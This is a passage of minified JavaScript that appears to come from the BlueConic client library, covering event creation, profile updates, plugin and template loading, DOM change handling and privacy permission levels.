          p = -1 < c.indexOfArray(w.types, a),
          r = !0 === b,
          n = null !== b && "object" === typeof b;
        r && (za = !0);
        if (p || h) {
          if (p && "PAGEVIEW" != a && !b) c.logWarning("An interaction is required for event type [" + a + "]");else {
            "PAGEVIEW" !== a || r || t.getProfile();
            "PAGEVIEW" !== a || ra && !r || (da && 0 < da.length && t.updateProfile(), r || g.handleRevisions());
            var p = {
                type: a,
                referrer: document.referrer,
                profile: null !== q ? q.getId() : c.getBcSessionId()
              },
              z;
            for (z in f) f.hasOwnProperty(z) && (p[z] = f[z]);
            n ? (f = fb.getParams(a, {
              timestamp: new Date(),
              data: b,
              profile: p.profile,
              referrer: p.referrer
            }, d), p.timelineContext = f.data, p.timestamp = f.timestamp, p.eventSource = f.eventSource) : p.interaction = b;
            w.create(p, this, function (f) {
              "VIEW" === a && f && Ra(f, !1);
              h && Ra(f, !1);
              c.doCallback(d, e, f);
              w.publish(a, b);
            });
            "VIEW" === a ? g.submitBatchTimeout(200, "VIEW") : h ? g.submitBatchTimeout(0, "DYNAMIC") : g.submitBatch();
          }
        } else w.publish(a, b);
      };
      u.prototype.setEditableNode = function (a, b) {
        this.functions.setEditableNode(a, b);
      };
      u.prototype.getHostname = function () {
        return X;
      };
      u.prototype.getIPAddress = function () {
        return sb;
      };
      u.prototype.getInteractions = function () {
        return K;
      };
      u.prototype.getInteractionNamesById = function (a) {
        var b = null;
        if (K && 0 < K.length) for (var c = 0; c < K.length; c++) K[c].id === a && (b = K[c]);
        return b;
      };
      u.prototype.getSegments = function () {
        return ja;
      };
      u.prototype.getTemplate = function (a, b) {
        if (a) {
          u.prototype._templateCallbacks || (u.prototype._templateCallbacks = {});
          var d = new Date().getTime() + Math.random();
          u.prototype._templateCallbacks[d] && (d = new Date().getTime() + Math.random());
          u.prototype._templateCallbacks[d] = {
            onSuccess: b,
            templateId: a
          };
          var e = function () {
            for (var a = c.getPropertiesFromObject(u.prototype._templateCallbacks), b = 0; b < a.length; b++) {
              var d = u.prototype._templateCallbacks[a[b]];
              if (d) {
                delete u.prototype._templateCallbacks[a[b]];
                var e = tb[d.templateId];
                if (!e) {
                  c.logWarning("Template with ID [" + d.templateId + "] is not found.");
                  break;
                }
                c.doCallback(this, d.onSuccess, e);
              }
            }
          };
          u.prototype.isInEditMode() && !u.prototype._isTemplateDownloading && (Aa = !1, Oa = null, l && c.logInfo("download templates again for edit mode"));
          Aa || u.prototype._isTemplateDownloading ? u.prototype._isTemplateDownloading || e() : (u.prototype._isTemplateDownloading = !0, a = (I ? BC_URL : Q()) + "/templates", c.loadScript(Oa ? a + "/" + Oa : a, this, function () {
            delete u.prototype._isTemplateDownloading;
            l && c.logInfo("finished template download");
            e();
          }));
        } else c.logWarning("A templateID is required for loading a template");
      };
      u.prototype.getChannelId = function () {
        return rb;
      };
      u.prototype.isInEditMode = function () {
        return k.name && "bc_dialogues" === k.name.substring(0, 12) || k.bcEditModeInstanceName && -1 < k.bcEditModeInstanceName.indexOf("bc_dialogues") ? !0 : !1;
      };
      u.prototype.setHostname = function (a) {
        c.logDeprecated("blueConicClient.setHostName", "Use setChannelIdentifier instead.");
        J = a;
      };
      u.prototype.setChannelIdentifier = function (a) {
        J = a;
      };
      u.prototype.getStaticUrlPrefix = function (a) {
        c.logDeprecated("blueConicClient.getStaticUrlPrefix", "Use getBaseURL instead");
        return c.getBaseURL(a);
      };
      u.prototype.getBaseURL = function (a) {
        return c.getBaseURL(a);
      };
      u.prototype.getRestEndpoint = function (a) {
        var b = Q() + "/rest/v2/custom/frontend/",
          d = c.getZoneId();
        d && (b += d + "/");
        a && (b += a);
        return b;
      };
      u.prototype.isInSimulatorMode = function () {
        return k.name && -1 < k.name.indexOf("bc_simulator");
      };
      u.prototype.getCurrentDate = function () {
        return u.prototype.isInSimulatorMode() && Xa ? Xa : new Date();
      };
      u.prototype.doNotShowAgain = function (a, b, c) {
        if (a && !this.isInEditMode()) {
          var d = this.profile.getProfile();
          d && (d.addValue("dialogues_do_not_show_again", a), this.profile.updateProfile(b, c));
        }
      };
      u.prototype.getProfileProperties = function (a, b) {
        var d = new Date().getTime() + ++g.requestId;
        g.addBatchRequest(g.GET_PROFILE_PROPERTIES, null, d, this, function (d) {
          var e = {};
          if (d && d.result) {
            d = d.result;
            if (d.properties) {
              var e = d.properties,
                h;
              for (h in e) e[h].permissionLevel && (e[h].permissionLevel = m[e[h].permissionLevel]);
            }
            c.doCallback(a, b, e);
          }
        });
        g.submitBatch();
      };
      u.prototype.handlePageView = function (a) {
        Ya && clearTimeout(Ya);
        Ya = setTimeout(function () {
          l && c.logInfo("handling asynchronous navigation for new url [" + document.location.href + "], creating new PAGEVIEW event to retrieve interactions for this url.");
          g.resetThrottlingCounter(!0);
          a && !0 === a.hidePositions && A.hideAllPositions();
          var b = document.getElementById(Qa);
          b && b.parentNode.removeChild(b);
          v._pendingInteractions = [];
          A.checkPreListeners();
          Va = !1;
          v.createEvent("PAGEVIEW", !0, this, function (a) {
            w.publish(w.ON_URL_CHANGE, {
              url: document.location.href
            });
            Ra(a, !1);
          });
        }, 10);
      };
      u.prototype.mail = {
        sendEmail: function (a, b, d, e) {
          var f = v._handledInteractions;
          if (f) {
            for (var h = null, p = 0, r = f.length; p < r && !h; p++) f[p] && f[p].context && f[p].context.getInteractionId() === a && (h = f[p].context);
            h && (locale = h._usedLocale, f = g.getNextRequestId(), a = {
              interactionId: [a],
              onlyOnce: [b],
              langId: [locale]
            }, t.updateProfile(), g.addBatchRequest(g.SEND_MAIL, a, f, this, function (a) {
              a && c.doCallback(d, e, a);
            }), g.submitBatch());
          }
        }
      };
      u.prototype.util = {
        loadScript: function (a, b, d) {
          c.loadScript(a, b, d);
        },
        loadJSON: function (a, b, d) {
          g.JSONP.get(a, null, function (a) {
            c.doCallback(b, d, a);
          });
        },
        loadCSS: function (a) {
          c.loadCSS(a);
        },
        load: function (a, b, d, e, f) {
          c.logDeprecated("blueConicClient.util.load (libname, libversion, liboptions, caller, onSuccess)", "blueConicClient.util.loadScript (url, caller, onSuccess)");
          "function" != typeof f ? c.logError('blueConicClient.util.load "onSuccess" is not a function') : c.loadScript(a, e, f);
        },
        loadLabels: function (a, b) {
          c.logDeprecated("blueConicClient.util.loadLabels(caller, onSuccess)", "blueConicClient.getProfileProperties(caller, onSuccess)");
          var d = g.getNextRequestId();
          g.addBatchRequest(g.GET_PROPERTY_LABELS, null, d, this, function (d) {
            var e = {};
            if (d && d.result) {
              d = d.result;
              if (d.properties) for (var h in d.properties) {
                e[h] = {};
                var p = d.properties[h],
                  r;
                for (r in p) e[h][r] = p[r];
              }
              c.doCallback(a, b, e);
            }
          });
          g.submitBatch();
        },
        log: function (a) {
          c.log(a);
        }
      };
      u.prototype.util.cookie = {
        setCookie: function (a, b, d) {
          return c.setCookie(a, b, d);
        },
        getCookie: function (a) {
          return c.getCookie(a);
        }
      };
      u.prototype.util.array = {
        ensureArray: function (a) {
          return c.ensureArray(a);
        },
        isArray: function (a) {
          return c.isArray(a);
        },
        diffArrays: function (a, b) {
          return c.diffArrays(a, b);
        },
        removeItemFromArray: function (a, b) {
          c.removeItemFromArray(a, b);
        },
        indexOfArray: function (a, b) {
          return c.indexOfArray(a, b);
        },
        mergeArrays: function (a, b) {
          c.mergeArrays(a, b);
        }
      };
      var yb = function (a) {
        return {
          updateProfile: function (a, d) {
            var b = a,
              f = d;
            "function" == typeof a && (c.logDeprecated("blueConicClient.profile.updateProfile (onSuccess, caller)", "blueConicClient.profile.updateProfile (caller, onSuccess)"), f = a, b = d);
            t.updateProfile(b, f);
            g.submitBatch();
          },
          createProfile: function (a, c) {
            t.createProfile(a, c);
            g.submitBatch();
          },
          deleteProfile: function (a, d) {
            var b = a,
              f = d;
            "function" == typeof a && (c.logDeprecated("blueConicClient.profile.deleteProfile (onSuccess, caller)", "blueConicClient.profile.deleteProfile (caller, onSuccess)"), f = a, b = d);
            t.deleteProfile(b, f);
            g.submitBatch();
          },
          getProfile: function () {
            return q ? new Y(a) : null;
          }
        };
      };
      u.prototype.functions = {
        setLocaleFunction: function (a) {
          a && "function" == typeof a ? (R = a.call(null), l && c.logInfo("runned locale function, the locale is now [" + R + "]")) : R = lb.call(this);
        },
        setEditableNode: function (a, b) {
          if (v.fn.postMessage && v.fn.getSelectorForElement) {
            var c = null;
            "string" == typeof a ? c = a : null != a && (c = v.fn.getSelectorForElement(a));
            v.fn.postMessage("editableNodeUpdate", {
              selector: c,
              options: b
            });
          }
        },
        sendMessage: function (a) {
          v.fn.postMessage && v.fn.postMessage("onInteractionMessage", a);
        }
      };
      u.prototype.json = {
        parse: function (a) {
          try {
            return c.checkNativeJsonLib(), Ca ? k.JSON.parse(a) : xa.parse(a);
          } catch (b) {
            return c.logError("Could not parse json [" + b.message + "]"), null;
          }
        },
        stringify: function (a, b, d) {
          try {
            c.checkNativeJsonLib();
            var e = !1,
              f = null;
            Array.prototype.toJSON && (e = !0, f = Array.prototype.toJSON, delete Array.prototype.toJSON);
            var h;
            if (Ca) return h = k.JSON.stringify(a, b, d), e && (Array.prototype.toJSON = f), h;
            h = xa.stringify(a, b, d);
            e && (Array.prototype.toJSON = f);
            return h;
          } catch (p) {
            return c.logError("Could not stringify object [" + p.message + "]"), null;
          }
        }
      };
      u.prototype.fn = {
        createInteraction: function (a) {
          if (a) {
            var b = c.getInteractionParameters(a);
            return new Fb(a, b);
          }
        },
        postMessage: function (a, b) {
          (k.opener && k.opener != k ? k.opener : k.parent).postMessage({
            event: a,
            message: b,
            instanceName: k.bcEditModeInstanceName || v.instanceName
          }, this.getBCUrl());
        },
        stringify: function (a, b, d) {
          return c.stringifyObject(a, b, d);
        },
        addGlobalVarToBlacklist: function (a) {
          la[a] = null;
        },
        addImplicitGlobalList: function (a) {
          y.call(eb, a);
        },
        handlePreListeners: function (a) {
          if (a) for (var b = 0, d = a.length; b < d; b++) {
            var e = a[b],
              f = e.getInteractionTypeId();
            l && c.logInfo("start handling pre listener [" + f + "]");
            var h = ab[f];
            if (h && "function" === typeof h) {
              var p = e.getBlueConicClient(),
                e = h.call(this, p, e);
              if (e.onPrepare && "function" === typeof e.onPrepare) {
                l && c.logInfo("call method [onPrepare] for listener [" + f + "]");
                try {
                  e.onPrepare();
                } catch (r) {
                  c.logError("an error occurred in interactiontype: [" + f + "]\x3cbr\x3ecalled method: [onPrepare]\x3cbr\x3eerror: " + r.message), l && console.error && console.error(r);
                }
              }
            }
          }
        },
        updateParams: function (a, b, c) {
          for (var d = v._handledInteractions, f = 0, h = d.length; f < h; f++) {
            var p = d[f];
            a && null === p.id && (p.id = a);
            if (p.id == a) {
              p.context.setParameters(b, c);
              var r = "function" == typeof p.interaction.onUpdate ? p.interaction.onUpdate : null;
              r && r.call(p.interaction);
            }
          }
        },
        handleInteractions: function (a, b) {
          a = A.handleLocalEditModeInteractions(a);
          var d = A.prepareInteractions(a, b);
          (a = document.getElementById(ub)) && a.parentNode.removeChild(a);
          a = [];
          for (var e = 0, f = d.length; e < f; e++) {
            var h = d[e];
            if (h.getPreloadProperties) try {
              var p = h.getPreloadProperties();
              c.mergeArrays(a, p);
            } catch (n) {
              c.logError("an error occured in interactiontype: [" + h.ctx.getInteractionTypeId() + "]\x3cbr\x3ecalled method: [getPreloadProperties]\x3cbr\x3eerror: " + n.message), l && console.error && console.error(n);
            }
          }
          if (q && 0 < a.length) {
            l && c.logInfo("start preloading " + a.length + " profile properties");
            var r = 0,
              p = function () {
                r++;
                2 === r && A.executeInteractionsOnDocReady(d, b);
              };
            A.downloadLibraries(p);
            q.loadValues(a, this, p);
          } else l && c.logInfo("skip preloading " + a.length + " profile properties"), A.executeInteractionsOnDocReady(d, b);
        },
        getBCHostnameAwarePluginsRepositoryUrl: function (a, b) {
          var c = qa();
          return c ? c + b : a;
        },
        getBCHostnameAwareLocalPluginsUrl: function () {
          return qa() || BC_URL;
        },
        getBCUrl: function () {
          return BC_URL;
        },
        registerInteractionType: function (a, b, d, e) {
          var f = [];
          if (b) {
            for (var h = 0; d && h < d.length; h++) y.call(f, d[h].url + " - " + d[h].sharing);
            l && c.logInfo("register plugin [" + a + "] with libraries \x3cbr\x3e" + f.join("\x3cbr\x3e"));
          } else return c.logInfo("did not register interactionype with id : [" + a + "]. InteractionTypeImpl is undefined."), null;
          var p;
          (function () {
            p = function (d, e) {
              try {
                return new b(d, e);
              } catch (z) {
                c.logError("an error occured in interactiontype: [" + a + "]\x3cbr\x3ecalled method: [init]\x3cbr\x3eerror: " + z.message), l && console.error && console.error(z);
              }
            };
          })();
          if (e) for (f = 0; f < e.length; f++) (h = e[f]) && h.id && h.baseUrl && !Ga[h.id] && (Ga[h.id] = h.baseUrl);
          ab[a] = p;
          bb[a] = d;
        },
        registerLibrary: function (a, b, d) {
          l && c.logInfo("register library [" + a + "]");
          ca[a] = {
            libraryFunction: b,
            libraryName: d
          };
        },
        registerTemplates: function (a) {
          if (a && !Aa) {
            var b = c.getPropertiesFromObject(a);
            l && c.logInfo("registering templates with the following IDs [" + b + "]");
            for (var d = 0; d < b.length; d++) {
              var e = a[b[d]];
              e.css !== E && e.js !== E && e.html !== E && (tb[b[d]] = new Hb(b[d], e.html, e.css, e.js, e.precompiled ? e.precompiled : null));
            }
            Aa = !0;
          }
        },
        saveGlobalVariables: function () {
          var a = {},
            b = [],
            d = null;
          for (d in k) la[d] === E && (a[d] = k[d], y.call(b, d));
          "undefined" === typeof k.jQuery || k.propertyIsEnumerable("jQuery") || (a.jQuery = k.jQuery, y.call(b, "jQuery"));
          for (var e = eb.length, f = 0; f < e; f++) d = eb[f], -1 === c.indexOfArray(b, d) && k[d] && (a[d] = k[d], y.call(b, d));
          return function () {
            for (var d = [], e = b.length, f = 0; f < e; f++) {
              var n = b[f];
              if (la[n] === E && k[n] !== a[n]) {
                l && c.logInfo(typeof k[n] + " [" + n + "] moved to private space");
                this[n] = k[n];
                y.call(d, n);
                try {
                  k[n] = a[n];
                } catch (Ma) {}
              }
            }
            var e = [],
              z;
            for (z in k) la[z] === E && e.push(z);
            "undefined" === typeof k.jQuery || k.propertyIsEnumerable("jQuery") || e.push("jQuery");
            z = c.diffArrays(e, b);
            e = 0;
            for (f = z.length; e < f; e++) {
              var n = z[e],
                g = typeof k[n];
              if (la[n] === E && (this[n] = k[n], y.call(d, n), "jQuery" === n)) try {
                k[n] = E, delete k[n];
              } catch (Ma) {}
              l && c.logInfo(g + " [" + n + "] added to private space");
            }
            return d;
          };
        },
        importLibraries: function (a) {
          a = c.ensureArray(a);
          var b = a.length;
          if (0 !== b) {
            for (var d = zb(), e = 0; e < b; e++) Ab.call(this, a[e]);
            d.call(this);
          }
        },
        importAndCacheLibraries: function (a) {
          a = c.ensureArray(a);
          var b = a.length,
            d = this.ctx.getInteractionTypeId();
          if (0 !== b) if (d) for (var e = 0; e < b; e++) {
            var f = a[e],
              h = ca[f];
            if (h === E) l && c.logError("unexisting library [" + f + "] for interactiontype [" + d + "]");else {
              var g = h.libraryName;
              Pa[g] ? (function (a) {
                for (var b, d = 0; d < a.length; d++) b = a[d], l && c.logInfo("added [" + b.key + "] from cache to private space"), this[b.key] = b.object;
              }.call(this, Pa[g]), l && c.logInfo("retrieved library [" + f + "] from cache with key [" + g + "] for interactiontype [" + d + "]")) : (Pa[g] = [], function (a, b) {
                var e = zb();
                Ab(a);
                for (var e = e.call(this), f = 0; f < e.length; f++) {
                  var h = {
                    key: null,
                    object: null
                  };
                  h.key = e[f];
                  h.object = this[e[f]];
                  y.call(b, h);
                }
                l && c.logInfo("added library [" + a + "] to cache with key [" + g + "] for interactiontype [" + d + "]");
              }.call(this, f, Pa[g]));
            }
          } else l && c.logInfo("Could not determine the interactiontype during library import");
        },
        parseLibrary: function (a) {
          if (ca) {
            if (ca[a]) {
              var b = ca[a].libraryFunction;
              if (b && "function" == typeof b) {
                l && c.logInfo("start import library [" + a + "]");
                var d = null,
                  e = null;
                k.define && (l && c.logInfo('moving "window.define" out of the way, to make sure library [' + a + "] is parsed properly"), d = k.define, k.define = null);
                "object" === typeof module && "object" === typeof module.exports && (l && c.logInfo('moving "module.exports" out of the way, to make sure library [' + a + "] is parsed properly"), e = module.exports, module.exports = E);
                b.call(this);
                d && (l && c.logInfo("resetting window.define to original state."), k.define = d);
                e && (l && c.logInfo("resetting module.exports to original state."), module.exports = e);
              } else c.logError("library with url [" + a + "] not found");
            } else c.logError("the external library [" + a + "] is declared in the plugin XML but not present.");
          } else c.logError("the external libraries are not loaded");
        },
        getDomainGroup: function (a) {
          a = c.hash(a);
          for (var b in va) {
            var d = va[b],
              e;
            for (e in d) if (d[e] == a) return b;
          }
          return "DEFAULT";
        },
        setRequestInfo: function (a) {},
        getDOMElement: function (a) {
          return c.getDOMElement(a);
        },
        version: "2.4.0"
      };
      var Bb = u.prototype.fn.createInteraction,
        Ra = u.prototype.fn.handleInteractions,
        Yb = u.prototype.fn.registerInteractionType,
        Zb = u.prototype.fn.handlePreListeners,
        zb = u.prototype.fn.saveGlobalVariables,
        Ab = u.prototype.fn.parseLibrary,
        A = {
          getBlueConicClient: function (a) {
            var b = v,
              c = a && -1 < a.getInteractionTypeId().indexOf("editmode_") && ("GLOBALLISTENER" === a.getType() || "ACTION" === a.getType());
            a && !c && (a.getInteractionId() === a.getInteractionTypeId() && "TOOLBAR" !== a.getType() || "GLOBALLISTENER" === a.getType()) ? (b = new u(), b.profile = new yb(a.getInteractionTypeId())) : b || (b = new u(), b.profile = new yb());
            return b;
          },
          publishPlainEventAndCallHook: function (a) {
            if (Sb) try {
              var b;
              document.createEvent ? (b = document.createEvent("Event"), b.initEvent(a, !0, !0), k.dispatchEvent(b)) : (b = document.createEventObject(), k.fireEvent(a, b));
            } catch (d) {}
            try {
              if (k[a] && "function" === typeof k[a]) k[a]();
            } catch (d) {}
          },
          hideAllPositions: function () {
            var a = J ? J : document.location.hostname;
            l && c.logInfo("start hide all positions for hostname [" + a + "]");
            var b = O[c.hash(a)];
            b && 0 < b.length && c.addCSSToDOM(b, cb, 1250);
            l && c.logInfo("finished hide all positions for hostname [" + a + "]");
          },
          checkPreListeners: function () {
            var a = [];
            if (da.length && 0 < da.length) {
              for (var b = 0, c = da.length; b < c; b++) {
                var e = da[b];
                Yb(e.id, e.interactionType);
                e = Bb({
                  id: e.id,
                  name: e.id,
                  interactionType: {
                    myId: e.id
                  }
                });
                y.call(a, e);
              }
              Zb(a);
            }
            vb = !0;
          },
          observeDOMChanges: function () {
            var a = v,
              b = document.getElementsByTagName("body")[0];
            b && !a._observer && (k.MutationObserver || k.WebKitMutationObserver || k.MozMutationObserver ? (a._observer = new MutationObserver(function (a, b) {
              A.handleDOMMutation();
            }), a._observer.observe(b, {
              childList: !0,
              subtree: !0,
              characterData: !0
            })) : k.addEventListener && b.addEventListener("DOMNodeInserted", function () {
              A.handleDOMMutation();
            }, !1));
          },
          handleDOMMutation: function () {
            v._handleMutationTO && clearTimeout(v._handleMutationTO);
            v._handleMutationTO = setTimeout(function () {
              var a = v._pendingInteractions.length;
              v.isPaused !== E && v.isPaused || l && c.logInfo("dom mutation detected, #pending interactions: [" + a + "]");
              0 < a && (a = A.handleOnLoad(v._pendingInteractions.slice(), !1), l && c.logInfo("dom mutation detected, #handled: [" + a.length + "]"), 0 < a.length && ((a = document.getElementById(Qa)) && a.parentNode.removeChild(a), A.hidePendingPositions()));
              if ((a = P.getSelectors().concat()) && 0 < a.length) {
                l && c.logInfo("listener subscribers found for the following selectors: [" + a + "]. Callbacks will be called now.");
                for (var b = 0; b < a.length; b++) {
                  var d = a[b];
                  try {
                    d && c.getDOMElement(d) && P.publish(d);
                  } catch (e) {
                    l && console.error(e);
                  }
                }
              }
              delete v._handleMutationTO;
            }, 100);
          },
          isNative: function (a, b) {
            (a = /\{\s*\[native code\]\s*\}/.test("" + a)) || c.logWarning("function: [" + b + "] is not native any more, the target website overruled it.");
            return a;
          },
          handleLocalEditModeInteractions: function (a) {
            if (!u.prototype.isInEditMode()) return a;
            for (var b = [], d = [], e = 0; e < a.length; e++) {
              var f = a[e],
                h = f.getInteractionTypeId();
              y.call(b, h);
              f.isLocalEditMode() ? l && c.logInfo("skipping local edit mode interaction [" + h + "]") : y.call(d, f);
            }
            for (a = 0; a < sa.length; a++) e = sa[a], f = e.getInteractionTypeId(), e.isLocalEditMode() && (h = f.substring(11), -1 !== b.indexOf(h) && (l && c.logInfo("adding local edit mode interaction [" + f + "] for interaction type [" + h + "]"), Ub.call(d, e)));
            return d;
          },
          shouldExecute: function (a, b) {
            for (var d = 0, e = v._handledInteractions.length; d < e; d++) {
              var f = v._handledInteractions[d],
                f = -1 < c.indexOfArray(Rb, b) && a === f.id,
                h = !1;
              f || (h = a && -1 < a.indexOf("editmode_"));
              if (f || h) return !1;
            }
            return !0;
          },
          executeInteractionsOnDocReady: function (a, b) {
            b ? A.downloadLibraries(function () {
              A.injectLibraries(a);
              ga ? A.callInteractionMethods(a, b) : c.bindDocumentReady(this, function () {
                A.callInteractionMethods(a, b);
              });
            }) : (A.injectLibraries(a), ga ? A.callInteractionMethods(a, b) : c.bindDocumentReady(this, function () {
              A.callInteractionMethods(a, b);
            }));
          },
          downloadLibraries: function (a) {
            mb ? c.doCallback(this, a) : Wa ? ha.push(a) : (ha.push(a), Wa = !0, l && c.logInfo("start library download from url [/plugin/library] with version [" + La + "]"), a = I ? BC_URL : Q(), a = La ? a + "/plugin/library/" + La : a + "/plugin/library", I && (a += "_e"), c.loadScript(a, this, function () {
              mb = !0;
              Wa = !1;
              l && c.logInfo("finished library download");
              if (ha && 0 < ha.length) {
                for (var a = 0; a < ha.length; a++) ha[a] && c.doCallback(this, ha[a]);
                ha = [];
              }
            }));
          },
          injectLibraries: function (a) {
            for (var b = 0, d = a.length; b < d; b++) {
              var e = a[b].ctx.getInteractionTypeId(),
                f = a[b].ctx.getName() ? a[b].ctx.getName() : a[b].ctx.getInteractionId();
              l && c.logInfo("start import libraries for interaction [" + f + "]");
              bb[e] && a[b].importLibraries(bb[e]);
              l && c.logInfo("finished import libraries for interaction [" + f + "]");
            }
          },
          prepareInteractions: function (a, b) {
            for (var d = [], e = 0, f = a.length; e < f; e++) {
              var h = a[e],
                g = h.getInteractionTypeId(),
                r = h.getName() ? h.getName() : h.getInteractionId();
              if (b || !v._handledInteractions || A.shouldExecute(h.getInteractionId(), h.getType())) {
                l && c.logInfo("start initializing interaction [" + r + "], interaction type [" + g + "]");
                var n = ab[g];
                if (n && "function" === typeof n) {
                  var z = h.getBlueConicClient();
                  if (n = n.call(this, z, h)) {
                    n.ctx = h;
                    if (n.getContent && "function" == typeof n.getContent && "function" == typeof n.ctx.getPosition && n.ctx.getPosition()) {
                      z = h = null;
                      try {
                        h = n.getContent();
                      } catch (ib) {
                        c.logError("an error occured in interactiontype: [" + n.ctx.getInteractionTypeId() + "]\x3cbr\x3ecalled method: [getContent]\x3cbr\x3eerror: " + ib.message), l && console.error && console.error(ib);
                      }
                      z = n.ctx.getPosition();
                      u.prototype.isInSimulatorMode() && !h && z && n.ctx.getDOMElement();
                      h && z && (l && c.logInfo("start set content mechanism for interaction [" + r + "] with position [" + z + "]"), function (a, b, d) {
                        function e() {
                          h++;
                          (f = d.ctx.getDOMElement()) ? d.ctx.isOnLoadExecuted() ? l && c.logInfo('"onLoad" already executed for interaction [' + r + '], skipping "getContent"') : (d.ctx.setGetContentExecuted(!0), c.setContent(f, a), l && c.logInfo("[+] set content on position [" + b + "] was successful, recursion [" + h + "]")) : 50 <= h ? l && c.logInfo("failed to set content on position [" + b + "] max recursion reached") : ra ? l && c.logInfo("failed to set content on position [" + b + "] onEvent started") : k.setTimeout(e, 100);
                        }
                        var f = null,
                          h = 0;
                        e.call(this);
                      }(h, z, n));
                    }
                    y.call(d, n);
                  }
                } else l && c.logInfo("InteractionType with id [" + g + "] not found");
                l && c.logInfo("finished initializing interaction [" + r + "], interaction type [" + g + "]");
              } else l && c.logInfo("skipping interaction, already executed [" + r + "], interaction type [" + g + "]");
            }
            return d;
          },
          handleOnLoad: function (a, b) {
            for (var d = [], e = 0, f = a.length; e < f; e++) {
              var h = a[e];
              if (h) {
                var g = "function" == typeof h.onLoad ? h.onLoad : h.onEvent,
                  r = h.ctx.getName() ? h.ctx.getName() : h.ctx.getInteractionId(),
                  n = h.ctx;
                if (b || !v._handledInteractions || A.shouldExecute(n.getInteractionId(), n.getType())) if (n.getPosition() && n.getDOMElement() || !n.getPosition() && !n.isPositionTypePlugin() || n.getPosition() && n.isGetContentExecuted()) {
                  c.removeItemFromArray(v._pendingInteractions, h);
                  l && c.logInfo("[+] start onEvent for interaction [" + r + "]");
                  d.push({
                    id: n.getInteractionId(),
                    name: n.getName(),
                    position: n.getPosition(),
                    type: n.getInteractionTypeId(),
                    isPositionFound: n.isPositionFound()
                  });
                  v._handledInteractions.push({
                    id: n.getInteractionId(),
                    interaction: h,
                    context: n
                  });
                  try {
                    n.setOnLoadExecuted(!0);
                    var z = n.getBlueConicClient(),
                      k = I ? BC_URL : Q();
                    g.call(h, z.profile.getProfile(), n.getParameters(), n.getPosition(), z, n.getInteractionId(), k);
                  } catch (Ma) {
                    c.logError("an error occured in interactiontype: [" + n.getInteractionTypeId() + "]\x3cbr\x3ecalled method: [onEvent]\x3cbr\x3eerror: " + Ma.message), l && console.error && console.error(Ma);
                  }
                  l && c.logInfo("finished onEvent for interaction [" + r + "]");
                } else if (n.getPosition()) {
                  g = !0;
                  for (r = 0; r < blueConicClient._pendingInteractions.length; r++) g && blueConicClient._pendingInteractions[r] && blueConicClient._pendingInteractions[r].ctx.getInteractionId() === n.getInteractionId() && (g = !1);
                  g && v._pendingInteractions.push(h);
                }
              }
            }
            0 < d.length && !b && w.publish("onHandledInteractions", {
              handledInteractions: d
            });
            return d;
          },
          callInteractionMethods: function (a, b) {
            ga ? (za = ra = !0, v._pendingInteractions || (v._pendingInteractions = []), v._handledInteractions || (v._handledInteractions = []), l && c.logInfo("start running interactions"), b && w.publish(w.ON_BEFORE_INTERACTIONS), a = A.handleOnLoad(a, b), l && c.logInfo("finished running interactions"), w.publish(w.ON_EVENT_READY, {
              blueConicClient: v,
              handledInteractions: a,
              isFirstLoad: b
            }), b && (0 < v._pendingInteractions.length && A.hidePendingPositions(), A.observeDOMChanges()), za = ra = !1, v.profile.updateProfile()) : l && c.logInfo("cannot run onLoad: document ready [" + ga + "]");
          },
          hidePendingPositions: function () {
            if (0 < v._pendingInteractions.length) {
              for (var a = O[c.hash(J ? J : document.location.hostname)], b = [], d = 0; d < v._pendingInteractions.length; d++) {
                var e = v._pendingInteractions[d];
                -1 < c.indexOfArray(a, e.ctx.getPosition()) && b.push(e.ctx.getPosition());
              }
              0 < b.length && (l && c.logInfo("hiding interactions: [" + b + "]"), (a = document.getElementById(Qa)) && a.parentNode.removeChild(a), c.addCSSToDOM(b, Qa));
            }
          }
        };
      Y.prototype.permission = {
        getLevel: function () {
          return m.getLevel();
        },
        setLevel: function (a, b) {
          return m.setLevel(a, b);
        }
      };
      Y.prototype.timeline = {
        createEventById: function (a, b, d, e, f, h) {
          if (a && b) {
            if (!d) d = new Date();else if (!(d instanceof Date)) {
              l && c.logInfo("Timestamp must be of type 'Date'.");
              return;
            }
            a = {
              profile: null !== q ? q.getId() : c.getBcSessionId(),
              data: e,
              timestamp: d,
              eventId: a
            };
            fb.createEvent(b, a, f, h);
          } else l && c.logInfo("Timeline event must contain an ID and a type");
        },
        createEvent: function (a, b, d, e, f) {
          if (a) {
            if (!b) b = new Date();else if (!(b instanceof Date)) {
              l && c.logInfo("Timestamp must be of type 'Date'.");
              return;
            }
            b = {
              profile: null !== q ? q.getId() : c.getBcSessionId(),
              data: d,
              timestamp: b
            };
            fb.createEvent(a, b, e, f);
          } else l && c.logInfo("Timeline event must contain a type");
        }
      };
      Y.prototype.permission.optin = {};
      Y.prototype.permission.optout = {};
      var m = {
        DO_NOT_TRACK: "DO_NOT_TRACK",
        ANONYMOUS: "ANONYMOUS",
        PERSONAL: "PERSONAL",
        propertyOptOutHandler: null,
        propertyOptInHandler: null,
        pluginOptInHandler: null,
        pluginOptOutHandler: null,
        permissionLevel: null,
        previousPermissionLevel: null,
        isPermissionLevelChanged: !1,
        PermissionHandler: function () {
          this.itemList = [];
          this.removeList = [];
          this.addList = [];
          this.getAll = function () {
            return this.itemList;
          };
          this.add = function (a) {
            -1 === c.indexOfArray(this.itemList, a) && (y.call(this.itemList, a), y.call(this.addList, a), c.removeItemFromArray(this.removeList, a));
          };
          this.remove = function (a) {
            c.removeItemFromArray(this.itemList, a);
            y.call(this.removeList, a);
            c.removeItemFromArray(this.addList, a);
          };
          this.getRemoveList = function () {
            return this.removeList;
          };
          this.getAddList = function () {
            return this.addList;
          };
          this.set = function (a) {
            this.itemList = a;
          };
          this.clear = function () {
            this.addList = [];
            this.removeList = [];
          };
        },
        setLevel: function (a, b) {
          if (a !== m.DO_NOT_TRACK && a !== m.ANONYMOUS && a !== m.PERSONAL) return c.logInfo("invalid permission level [" + a + "]. Use one of \x3cbr\x3eblueConicClient.permission.level.DO_NOT_TRACK\x3cbr\x3eblueConicClient.permission.level.ANONYMOUS\x3cbr\x3eblueConicClient.permission.level.PERSONAL"), !1;
          m.previousPermissionLevel = m.permissionLevel;
          m.isPermissionLevelChanged = !0;
          m.message = b;
          m.permissionLevel = a;
          l && c.logInfo("setPermissionLevel from [" + m.previousPermissionLevel + "] to [" + m.permissionLevel + "]");
          return !0;
        },
        getLevel: function () {
          return m.permissionLevel;
        },
        createAPI: function () {
          function a(a) {
            var b = new m.PermissionHandler();
            a.getProfileProperties = function () {
              return b.getAll();
            };
            a.addProfileProperty = function (a) {
              return b.add(a);
            };
